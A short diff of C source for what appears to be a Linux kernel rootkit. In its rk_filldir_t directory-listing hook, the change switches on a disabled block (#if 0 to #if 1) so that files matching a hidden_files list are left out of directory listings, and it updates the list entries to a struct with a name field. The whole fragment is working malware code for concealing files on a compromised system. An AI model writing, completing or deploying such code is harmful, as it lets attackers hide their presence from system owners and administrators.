@@ -609,11 +609,10 @@ static int rk_filldir_t(struct dir_context* ctx, const char* proc_name, int len,
             return 0;
         }
     }
-    printk(KERN_ALERT "Checking %s\n", proc_name);
-#if 0
+#if 1
     for (i = 0; i < hidden_file_count; ++i) {
-        printk(KERN_ALERT "Checking %s against %s\n", proc_name, hidden_files[i]);
-        if (strncmp(proc_name, hidden_files[i], strlen(hidden_files[i])) == 0) {
+        printk(KERN_ALERT "Checking %s against %s\n", proc_name, hidden_files[i].name);
+        if (strncmp(proc_name, hidden_files[i].name, strlen(hidden_files[i].name)) == 0) {
             printk(KERN_ALERT "Found my hidden file\n");
             return 0;
         }
